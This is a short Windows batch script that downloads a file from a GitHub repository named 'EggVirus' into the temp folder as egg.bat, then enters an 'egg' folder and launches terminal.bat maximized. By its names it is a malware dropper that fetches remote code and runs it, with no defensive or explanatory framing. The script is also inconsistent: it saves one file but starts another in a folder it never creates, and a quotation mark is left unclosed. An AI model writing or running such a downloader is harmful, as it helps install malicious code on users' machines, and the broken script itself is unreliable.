@echo off
cd  %temp%
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://github.com/LordHAKA/EggVirus/egg', '.\egg.bat') }
cd egg
start /max terminal.bat 

